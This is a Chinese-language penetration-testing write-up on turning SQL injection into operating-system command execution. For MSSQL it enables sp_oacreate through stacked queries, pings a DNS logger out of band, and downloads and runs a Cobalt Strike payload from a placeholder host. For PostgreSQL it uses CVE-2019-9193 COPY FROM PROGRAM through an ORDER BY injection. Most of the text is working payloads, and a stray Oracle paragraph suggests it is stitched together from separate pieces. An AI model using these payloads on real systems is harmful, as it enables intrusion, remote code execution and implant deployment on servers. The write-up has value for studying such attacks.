前提是sa权限，同样需要查看当前用户。
当xp_cmdshell无法用，下面是实战中sql注入利用sp_oacreate。
mssql真实利用->上线CS

案例是where型注入
盲注探测是否存在注入：h_zt_yhlb_condition=where+1=1
添加注释符：h_zt_yhlb_condition=where+1=1--+发现页面明显区别，存在注入。
使用sqlserver盲注探测是否存在堆叠注入：
h_zt_yhlb_condition=+where+1=2;WAITFOR+DELAY'00:00:04'--+
明显延迟4s,因而能用。
接着开启sp_oacreate:
h_zt_yhlb_condition=+where+1=2;exec sp_configure 'show advanced options', 1;  RECONFIGURE;  exec sp_configure 'Ole Automation Procedures', 1;  RECONFIGURE;--+
然后是用ping命令探测是否存在：
h_zt_yhlb_condition=+where+1=2;Declare @runshell INT Exec SP_OACreate 'wscript.shell',@runshell out Exec SP_OAMeTHOD @runshell,'run',null,'ping dnslog.cn';--+
使用%%带外windows命令(其他带外命令参考：http://t.zoukankan.com/sunny11-p-14399420.html)，dnslog收到：
h_zt_yhlb_condition=+where+1=2;Declare @runshell INT Exec SP_OACreate 'wscript.shell',@runshell out Exec SP_OAMeTHOD @runshell,'run',null,'ping %os%.bc55a5cb.dnslog.rest';--+
上传cs马：
h_zt_yhlb_condition=+where+1=2;declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\Windows\Temp\sethc.exe -urlcache -split -f "http://ip:port/shell.exe" C:\Windows\Temp\shell.exe'h_zt_yhlb_condition=+where+1=2;Declare @runshell INT Exec SP_OACreate 'wscript.shell',@runshell out Exec SP_OAMeTHOD @runshell,'run',null,'cmd /c C:\Windows\Temp\23.exe -f C:\Windows\Temp\135.txt';--+

漏洞成因:
漏洞的成因是该函数的参数存在注入，而该函数的所有者是sys，所以通过注入就可以执行任意sql，该函数的执行权限为public，所以只要遇到一个oracle的注入点并且存在这个漏洞的，基本上都可以提升到最高权限。

0x04 postgresql
cve-2019-9193适用版本:9.3-11.2
select version();DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'id';SELECT * FROM cmd_exec;select *在注入语句中可能用不了，使用select cmd_output from cmd_exec进行查询。

真实注入案例：
field字段存在注入:查询语句如下：select id from work_order where 1=1 and delete_status=0 order by $field desc......由于注入字段存在于order by后，由于特性order by后面的字段不能被参数化查询(order by后跟字段字段被单引号包裹就是字符串了。而参数化查询需要添加单引号包裹成一个整体，因而不能对order by后面的字段进行参数化查询)，导致直接拼接存在注入。报错中存在org.postgresql.util.PSQLException:ERROR.所以是postgresql注入。由于Postgre支持堆叠查询，可以直接添加;然后加新语句如下：可以用延时注入检测：field:"1,1;select pg_sleep(3)--"延时3s.报错查询版本：field:"1,1;select 1 where 1=CAST((select version())::text AS numeric)--"不采用堆叠也可以执行语句：field:"1,select pg_sleep(3)"延时3s.field:"1,select "field:"1,CAST((select version())::text AS numeric)"
最后是使用cve在注入中命令执行：
field:"1,CAST((select version())::text AS numeric)"创建表：field:"1,1;CREATE TABLE cmd_exec(cmd_output text);--"执行命令结果存入cmd_exec表：field:"1,1;COPY cmd_exec FROM PROGRAM 'id';--"查询存储命令的表：field:"1,1;select 1 where 1=CAST((select * from cmd_exec)::text AS numeric)--"使用select 会自动select id导致不存在id column不存在。使用具体的字段(cmd_output)代表*：field:"1,1;select 1 where 1=CAST((select cmd_output from cmd_exec)::text AS numeric)--"ERROR: more than one row returned by a subquery used as an exception:使用limit即可。field:"1,1;select 1 where 1=CAST((select cmd_output from cmd_exec limit 1)::text AS numeric)--"最后是跑路(hh授权的)删除创建的表(pg里面好像叫relation):field:"1,1;drop table if exists cmd_exec--"
